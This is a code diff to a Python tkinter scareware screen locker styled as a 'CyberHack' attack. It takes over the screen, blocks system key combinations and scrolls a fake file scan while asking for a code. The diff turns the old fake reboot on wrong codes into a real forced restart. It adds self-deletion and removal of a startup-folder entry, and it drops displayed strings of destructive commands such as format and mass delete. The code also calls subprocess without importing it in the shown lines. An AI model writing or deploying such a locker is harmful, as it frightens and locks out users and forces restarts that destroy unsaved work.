@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import sys, os, base64, tempfile, time, threading, random, tkinter as tk
+import sys, os, base64, tempfile, time, threading, random, string, shutil, tkinter as tk
 
 try:
     import keyboard
@@ -18,41 +18,57 @@ BLOCKED = ["left windows", "right windows", "alt+tab", "alt+f4",
            "ctrl+esc", "alt+esc", "ctrl+shift+esc"]
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-ERROR_LOG   = os.path.join(SCRIPT_DIR, "error.log")
+ERROR_LOG  = os.path.join(SCRIPT_DIR, "error.log")
 
-SOUND_B64 = os.path.join(SCRIPT_DIR, "sound.b64")
-VOICE_B64 = os.path.join(SCRIPT_DIR, "voice.b64")
-SOUND_WAV = os.path.join(SCRIPT_DIR, "sound.wav")
-VOICE_WAV = os.path.join(SCRIPT_DIR, "voice.wav")
+START_B64   = os.path.join(SCRIPT_DIR, "start.b64")
+SOUND_B64   = os.path.join(SCRIPT_DIR, "sound.b64")
+VOICE_B64   = os.path.join(SCRIPT_DIR, "voice.b64")
+CORRECT_B64 = os.path.join(SCRIPT_DIR, "correct.b64")
+WRONG_B64   = os.path.join(SCRIPT_DIR, "wrong.b64")
 
-_TEMP_SOUND = os.path.join(tempfile.gettempdir(), "cyberhack_sound.wav")
-_TEMP_VOICE = os.path.join(tempfile.gettempdir(), "cyberhack_voice.wav")
+START_WAV   = os.path.join(SCRIPT_DIR, "start.wav")
+SOUND_WAV   = os.path.join(SCRIPT_DIR, "sound.wav")
+VOICE_WAV   = os.path.join(SCRIPT_DIR, "voice.wav")
+CORRECT_WAV = os.path.join(SCRIPT_DIR, "correct.wav")
+WRONG_WAV   = os.path.join(SCRIPT_DIR, "wrong.wav")
 
-DIR_S_TEXT = [
-    r"C:\>dir /s",
-    r"C:\Users\user>dir /s /b *.docx",
-    r"C:\Users\user>dir /s /b *.jpg",
-    r"C:\Windows\System32>dir /s /b",
-    r"C:\>del /f /q /s *.*",
-    r"C:\>format C: /q",
-    "C:\\>cipher /w:C:\\",
-    r"QCOLD ENCRYPTED",
-    r">>> ACCESS DENIED <<<",
-    r"C:\>reg delete HKLM\SOFTWARE /f",
-    r"CORRUPTING SYSTEM32...",
-    r"C:\>netsh wlan delete profile *",
-]
+_TEMP_START   = os.path.join(tempfile.gettempdir(), "cyberhack_start.wav")
+_TEMP_SOUND   = os.path.join(tempfile.gettempdir(), "cyberhack_sound.wav")
+_TEMP_VOICE   = os.path.join(tempfile.gettempdir(), "cyberhack_voice.wav")
+_TEMP_CORRECT = os.path.join(tempfile.gettempdir(), "cyberhack_correct.wav")
+_TEMP_WRONG   = os.path.join(tempfile.gettempdir(), "cyberhack_wrong.wav")
+
+DIR_SCAN_DURATION_MS = 6000
+DIR_SCAN_LINE_MS     = 1
+
+FAKE_EXTENSIONS = [".txt", ".docx", ".jpg", ".png", ".mp4", ".exe", ".dll",
+                   ".ini", ".log", ".cfg", ".pdf", ".zip", ".py", ".json"]
 
 
-# ----------------------------- SOUND -----------------------------
+def random_filename():
+    length = random.randint(190, 200)
+    name = "".join(random.choices(string.ascii_letters + string.digits, k=length))
+    ext = random.choice(FAKE_EXTENSIONS)
+    return name + ext
+
+
+def random_size():
+    return f"{random.randint(1, 999_999):,}".replace(",", " ")
+
+
+def fake_dir_line():
+    date = f"{random.randint(1,28):02d}.{random.randint(1,12):02d}.{random.randint(2018,2025)}"
+    tm   = f"{random.randint(0,23):02d}:{random.randint(0,59):02d}"
+    return f"{date}  {tm}    {random_size():>12} {random_filename()}"
+
+
+# ----------------------------- ЗВУК -----------------------------
 
 def _load_b64_file(path):
     try:
         with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            lines = [
-                ln.strip() for ln in f
-                if ln.strip() and "CERTIFICATE" not in ln
-            ]
+            lines = [ln.strip() for ln in f
+                     if ln.strip() and "CERTIFICATE" not in ln]
         return "".join(lines)
     except Exception:
         return None
@@ -82,6 +98,12 @@ def _decode_b64_to_wav(src, dst):
         return None
 
 
+def prepare_start():
+    if os.path.exists(START_WAV):
+        return START_WAV
+    return _decode_b64_to_wav(START_B64, _TEMP_START)
+
+
 def prepare_sound():
     if os.path.exists(SOUND_WAV):
         return SOUND_WAV
@@ -94,28 +116,45 @@ def prepare_voice():
     return _decode_b64_to_wav(VOICE_B64, _TEMP_VOICE)
 
 
-def play_sound():
-    if not HAS_SOUND:
-        return
-    path = prepare_sound()
-    if not path:
+def prepare_correct():
+    if os.path.exists(CORRECT_WAV):
+        return CORRECT_WAV
+    return _decode_b64_to_wav(CORRECT_B64, _TEMP_CORRECT)
+
+
+def prepare_wrong():
+    if os.path.exists(WRONG_WAV):
+        return WRONG_WAV
+    return _decode_b64_to_wav(WRONG_B64, _TEMP_WRONG)
+
+
+def _play(path):
+    if not HAS_SOUND or not path:
         return
     try:
         winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
     except Exception:
         pass
+
+
+def play_start():
+    _play(prepare_start())
+
+
+def play_sound():
+    _play(prepare_sound())
 
 
 def play_voice():
-    if not HAS_SOUND:
-        return
-    path = prepare_voice()
-    if not path:
-        return
-    try:
-        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
-    except Exception:
-        pass
+    _play(prepare_voice())
+
+
+def play_correct():
+    _play(prepare_correct())
+
+
+def play_wrong():
+    _play(prepare_wrong())
 
 
 def stop_all_sounds():
@@ -126,48 +165,6 @@ def stop_all_sounds():
             pass
 
 
-def play_windows_error():
-    if not HAS_SOUND:
-        return
-    try:
-        winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC)
-    except Exception:
-        pass
-
-
-# ----------------------------- BEEP -----------------------------
-
-def _beep_seq(seq, gap=0.0):
-    if not HAS_SOUND:
-        return
-    for freq, dur in seq:
-        try:
-            if freq <= 0:
-                time.sleep(dur / 1000.0)
-            else:
-                winsound.Beep(int(freq), int(dur))
-        except Exception:
-            pass
-        if gap:
-            time.sleep(gap)
-
-
-def sound_wrong():
-    threading.Thread(
-        target=lambda: _beep_seq([(300, 120), (200, 180)]),
-        daemon=True,
-    ).start()
-
-
-def sound_correct():
-    threading.Thread(
-        target=lambda: _beep_seq(
-            [(523, 90), (659, 90), (784, 90), (1046, 220)]
-        ),
-        daemon=True,
-    ).start()
-
-
 def sound_reboot_tick():
     if HAS_SOUND:
         try:
@@ -176,16 +173,7 @@ def sound_reboot_tick():
             pass
 
 
-def sound_final_joke():
-    threading.Thread(
-        target=lambda: _beep_seq(
-            [(880, 80), (660, 80), (880, 80), (990, 140)]
-        ),
-        daemon=True,
-    ).start()
-
-
-# ----------------------------- KEYS -----------------------------
+# ----------------------------- КЛАВИШИ -----------------------------
 
 def block_keys():
     for k in BLOCKED:
@@ -207,7 +195,73 @@ def unblock_keys():
         pass
 
 
-# ----------------------------- ART -----------------------------
+# ----------------------------- ОЧИСТКА -----------------------------
+
+def _remove_self_file(path):
+    """Удаляет файл через отдельный cmd-процесс (обход блокировки запущенного файла)."""
+    try:
+        if os.path.exists(path):
+            subprocess.Popen(
+                ["cmd", "/c", "del", "/f", "/q", path],
+                shell=False,
+                creationflags=0x08000000,  # CREATE_NO_WINDOW
+            )
+    except Exception:
+        pass
+
+
+def cleanup_all():
+    """Стирает ВСЁ. Вызывается только при правильном ключе или Ctrl+C."""
+    stop_all_sounds()
+    unblock_keys()
+
+    # 1. Файлы в C:\CyberHack
+    for f in (START_B64, SOUND_B64, VOICE_B64, CORRECT_B64, WRONG_B64,
+              START_WAV, SOUND_WAV, VOICE_WAV, CORRECT_WAV, WRONG_WAV):
+        try:
+            os.remove(f)
+        except Exception:
+            pass
+
+    # 2. Временные WAV
+    for f in (_TEMP_START, _TEMP_SOUND, _TEMP_VOICE, _TEMP_CORRECT, _TEMP_WRONG):
+        try:
+            os.remove(f)
+        except Exception:
+            pass
+
+    # 3. key.txt
+    try:
+        os.remove(os.path.join(SCRIPT_DIR, "key.txt"))
+    except Exception:
+        pass
+
+    # 4. Автозагрузка (через отдельный процесс, т.к. файл может быть запущен)
+    try:
+        startup = os.path.join(
+            os.environ.get("APPDATA", ""),
+            r"Microsoft\Windows\Start Menu\Programs\Startup\cyberhack_check.bat",
+        )
+        if os.path.exists(startup):
+            subprocess.Popen(
+                ["cmd", "/c", "del", "/f", "/q", startup],
+                shell=False,
+                creationflags=0x08000000,
+            )
+    except Exception:
+        pass
+
+    # 5. Себя (Locker.py) — через отдельный процесс
+    _remove_self_file(os.path.abspath(__file__))
+
+    # 6. Папка C:\CyberHack
+    try:
+        shutil.rmtree(SCRIPT_DIR, ignore_errors=True)
+    except Exception:
+        pass
+
+
+# ----------------------------- ASCII -----------------------------
 
 ASCII_CYBERHACK = r"""
   ██████╗██╗   ██╗██████╗ ███████╗██████╗
@@ -229,9 +283,7 @@ ASCII_CYBERHACK = r"""
 """
 
 
-
-
-# ----------------------------- WINDOW -----------------------------
+# ----------------------------- ОКНО -----------------------------
 
 class Locker:
     def __init__(self):
@@ -243,107 +295,69 @@ class Locker:
         self.root.attributes("-topmost", True)
         self.root.configure(bg="black")
 
-        self.attempts      = 0
-        self.stop_flag     = False
-        self.sector        = 0
-        self._dirs_started = False
-        self._pwd_shown    = False
+        self.attempts   = 0
+        self.stop_flag  = False
+        self.sector     = 0
+        self._pwd_shown = False
 
         self.blank = tk.Frame(self.root, bg="black")
         self.blank.pack(fill=tk.BOTH, expand=True)
+        play_start()
 
         self.root.after(1000, self._show_red)
-        self.root.after(6000, self._show_password_ui)
-
-    # ---------- red screen ----------
+        self.root.after(3000, self._start_dir_scan)
+        self.root.after(9000, self._show_password_ui)
 
     def _show_red(self):
+        if self._pwd_shown:
+            return
         for w in self.root.winfo_children():
             w.destroy()
         self.red = tk.Frame(self.root, bg="#7a0000")
         self.red.pack(fill=tk.BOTH, expand=True)
         play_sound()
-        self.root.after(2000, self._start_dirs)
 
-    # ---------- dir/s rain ----------
-
-    def _start_dirs(self):
-        if self._dirs_started:
+    def _start_dir_scan(self):
+        if self._pwd_shown:
             return
-        self._dirs_started = True
-
         for w in self.root.winfo_children():
             w.destroy()
 
         play_voice()
 
-        self.canvas = tk.Canvas(self.root, bg="black",
-                                highlightthickness=0, bd=0)
-        self.canvas.pack(fill=tk.BOTH, expand=True)
-
-        self.sw = self.root.winfo_screenwidth()
-        self.sh = self.root.winfo_screenheight()
-
-        self.columns = []
-        for x in range(0, self.sw, 260):
-            self.columns.append({
-                "x":     x,
-                "y":     random.randint(-self.sh, 0),
-                "speed": random.randint(6, 16),
-                "lines": [random.choice(DIR_S_TEXT) for _ in range(30)],
-            })
-
-        self.canvas.create_text(
-            self.sw // 2, 80,
-            text="CyberHack",
-            fill="#ff2222",
-            font=("Consolas", 72, "bold"),
+        self.text_widget = tk.Text(
+            self.root, bg="black", fg="#ff0000",
+            font=("Consolas", 9),
+            borderwidth=0, highlightthickness=0,
+            insertbackground="#ff0000", wrap="none",
         )
-        self.canvas.create_text(
-            self.sw // 2, 165,
-            text="YOUR FILES ARE ENCRYPTED",
-            fill="#ff4444",
-            font=("Consolas", 22, "bold"),
-        )
-        self.canvas.create_text(
-            self.sw // 2, 205,
-            text="☠  HACKER GROUP  Q C O L D  ☠",
-            fill="#ff6666",
-            font=("Consolas", 16),
-        )
+        self.text_widget.pack(fill="both", expand=True)
+        self.text_widget.config(state="disabled")
 
-        self._animate_dirs()
+        self._scan_elapsed = 0
+        self._append_line("C:\\Users\\User>dir /s")
+        self._append_line("")
+        self.root.after(100, self._scan_tick)
 
-    def _animate_dirs(self):
+    def _append_line(self, line):
         try:
-            self.canvas.delete("rain")
+            self.text_widget.config(state="normal")
+            self.text_widget.insert("end", line + "\n")
+            self.text_widget.see("end")
+            self.text_widget.config(state="disabled")
         except tk.TclError:
+            pass
+
+    def _scan_tick(self):
+        if self._pwd_shown:
             return
-
-        for col in self.columns:
-            x, y = col["x"], col["y"]
-            for i, line in enumerate(col["lines"][:18]):
-                yy = y + i * 20
-                if yy < 230 or yy > self.sh:
-                    continue
-                color = ("#ff6666" if i == 0 else
-                         "#ff2222" if i < 5  else
-                         "#aa0000" if i < 12 else "#550000")
-                self.canvas.create_text(
-                    x, yy, text=line, fill=color, anchor="nw",
-                    font=("Consolas", 13, "bold"), tags="rain",
-                )
-            col["y"] += col["speed"]
-            if col["y"] - 18 * 20 > self.sh:
-                col["y"]     = random.randint(-self.sh, 0)
-                col["speed"] = random.randint(6, 16)
-
-        self.root.after(70, self._animate_dirs)
-
-    # ---------- password UI ----------
+        if self._scan_elapsed >= DIR_SCAN_DURATION_MS:
+            return
+        self._append_line(fake_dir_line())
+        self._scan_elapsed += DIR_SCAN_LINE_MS
+        self.root.after(DIR_SCAN_LINE_MS, self._scan_tick)
 
     def _show_password_ui(self):
-        # Guard against double-call (6 s timer + manual)
         if self._pwd_shown:
             return
         self._pwd_shown = True
@@ -385,9 +399,6 @@ class Locker:
         self.progress_label.pack(fill=tk.X, padx=40, pady=5)
 
         self.entry.bind("<Return>", self.check_password)
-
-        # FIX: use root.after instead of a background thread —
-        # tkinter widgets must only be touched from the main thread.
         self._tick_sector()
 
     def _tick_sector(self):
@@ -402,14 +413,12 @@ class Locker:
             return
         self.root.after(100, self._tick_sector)
 
-    # ---------- password check ----------
-
     def check_password(self, event=None):
         pwd = self.entry.get().strip()
         self.entry.delete(0, tk.END)
 
         if not pwd.isdigit():
-            sound_wrong()
+            play_wrong()
             self.text.configure(state="normal")
             self.text.insert(tk.END, "\nТолько цифры.\n")
             self.text.see(tk.END)
@@ -419,13 +428,13 @@ class Locker:
         if pwd == PASSWORD:
             self.stop_flag = True
             stop_all_sounds()
-            sound_correct()
+            play_correct()
             self.text.configure(state="normal")
             self.text.insert(tk.END, "\n\nДОСТУП РАЗРЕШЁН. ЭТО БЫЛА ШУТКА.\n")
             self.text.see(tk.END)
             self.text.configure(state="disabled")
             unblock_keys()
-            self.root.after(1500, self.root.destroy)
+            self.root.after(1500, self._finish_and_cleanup)
             return
 
         self.attempts += 1
@@ -435,53 +444,50 @@ class Locker:
             self.stop_flag = True
             stop_all_sounds()
             unblock_keys()
-            self.fake_reboot()
+            self.real_reboot()
             return
 
-        sound_wrong()
+        play_wrong()
         self.text.configure(state="normal")
         self.text.insert(tk.END, f"\nНеверный код. Осталось попыток: {left}\n")
         self.text.see(tk.END)
         self.text.configure(state="disabled")
 
-    # ---------- fake reboot ----------
-
-    def fake_reboot(self):
+    def real_reboot(self):
         self.progress_label.config(text="▓▓▓  SYSTEM IS REBOOTING...  ▓▓▓")
         self.text.configure(state="normal")
 
-        # Insert a blank separator line, then the initial bar.
-        # We record the bar's line number *before* inserting it so
-        # the loop can overwrite just that line each tick — this is
-        # the fix for the original bug where delete("end-2l","end-1l")
-        # either ate existing text or accumulated duplicate lines.
         self.text.insert(tk.END, "\n")
         bar_line = int(self.text.index(tk.END).split(".")[0])
         self.text.insert(tk.END, "[" + "-" * 40 + "]   0%\n")
         self.text.see(tk.END)
         self.root.update()
 
-        for i in range(1, 41):
+        for i in range(1, 101):
             time.sleep(0.05)
             sound_reboot_tick()
-            bar = "#" * i + "-" * (40 - i)
-            pct = i * 100 // 40
-            # Replace only the bar line's content; the trailing \n stays.
+            bar = "#" * (i * 40 // 100) + "-" * (40 - i * 40 // 100)
             self.text.delete(f"{bar_line}.0", f"{bar_line}.end")
-            self.text.insert(f"{bar_line}.0", f"[{bar}] {pct:3d}%")
+            self.text.insert(f"{bar_line}.0", f"[{bar}] {i:3d}%")
             self.text.see(tk.END)
             self.root.update()
 
-        self.text.insert(tk.END, "\n\nШУТКА. НИКАКОГО РЕБУТА. :)\n")
+        self.text.insert(tk.END, "\n\nSYSTEM IS REBOOTING...\n")
         self.text.see(tk.END)
-        sound_final_joke()
-        self.root.after(2000, self.root.destroy)
+        self.root.update()
 
-    # ---------- run ----------
+        os.system("shutdown /r /t 0")
+
+    def _finish_and_cleanup(self):
+        try:
+            self.root.destroy()
+        except Exception:
+            pass
+        cleanup_all()
+        os._exit(0)
 
     def run(self):
         block_keys()
-        play_windows_error()
         self.root.mainloop()
 
 
@@ -491,6 +497,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         unblock_keys()
         stop_all_sounds()
+        cleanup_all()
         sys.exit(0)
     except Exception:
         import traceback
@@ -499,6 +506,7 @@ if __name__ == "__main__":
                 f.write(traceback.format_exc())
         except Exception:
             pass
+        cleanup_all()
         raise
     finally:
         unblock_keys()
